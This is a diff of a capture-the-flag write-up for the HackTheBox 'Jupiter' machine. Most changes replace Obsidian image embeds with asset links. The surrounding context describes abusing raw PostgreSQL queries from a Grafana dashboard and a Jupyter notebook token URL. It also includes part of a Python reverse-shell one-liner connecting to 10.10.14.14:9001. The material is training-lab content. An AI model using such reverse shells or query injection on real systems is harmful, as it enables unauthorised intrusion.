@@ -63,7 +63,7 @@ echo "$TARGET   jupiter.htb" >> /etc/hosts
 firefox http://jupiter.htb &
 ```
 
-![[Pasted image 20230729180605.png]]
+![](assets/web_home.png)
 
 
 ```shell
@@ -144,21 +144,21 @@ echo "$TARGET   jupiter.htb  kiosk.jupiter.htb" >> /etc/hosts
 firefox http://kiosk.jupiter.htb &
 ```
 
-![[Pasted image 20230729181943.png]]
+![](assets/moons.png)
 
 This is a graphana dashboard
 
-![[Pasted image 20230729182233.png]]
+![](assets/grafana.png)
 
 When analyzing the HTTP requests while browsing on this site, a raw postgreSQL a done :
 
-![[Pasted image 20230729183200.png]]
+![](assets/query_post.png)
 
 We can also notice in the response the header `Server: nginx/1.18.0 (Ubuntu)`, so the target is a Linux server.
 
 We can send this HTTP request tro the repeater tool, and analyse this database :
 
-![[Pasted image 20230729184016.png]]
+![](assets/select_values.png)
 
 Nothing seems valuable when exploring the database, so let's try to get a reverse shell
 
@@ -496,7 +496,7 @@ firefox http://127.0.0.1:8888
 
 Thi is a JUpyter notebook :
 
-![[Pasted image 20230810235450.png]]
+![](assets/jupyter.png)
 
 As previously noticed, 
 
@@ -534,17 +534,17 @@ Open the page :
 
 http://127.0.0.1:8888/?token=97d5fd7a67d347cb76d101a9151b5034dd10a7b12fcc96c7
 
-![[Pasted image 20230811000522.png]]
+![](assets/jupyter_tree.png)
 
 We can open the Jupyter notebook "flares.ipynb" :
 
 http://127.0.0.1:8888/notebooks/flares.ipynb
 
-![[Pasted image 20230811000814.png]]
+![](assets/jupyter_flares.png)
 
 
 
-![[Pasted image 20230811180526.png]]
+![](assets/jupyter_new_notebook.png)
 
 Python 3 (ikernel)
 
@@ -556,7 +556,7 @@ import os,pty,socket;s=socket.socket();s.connect(("10.10.14.14",9001));[os.dup2(
 
 And execute it :
 
-![[Pasted image 20230811180825.png]]
+![](assets/jupyter_run.png)
 
 With the listener :
 
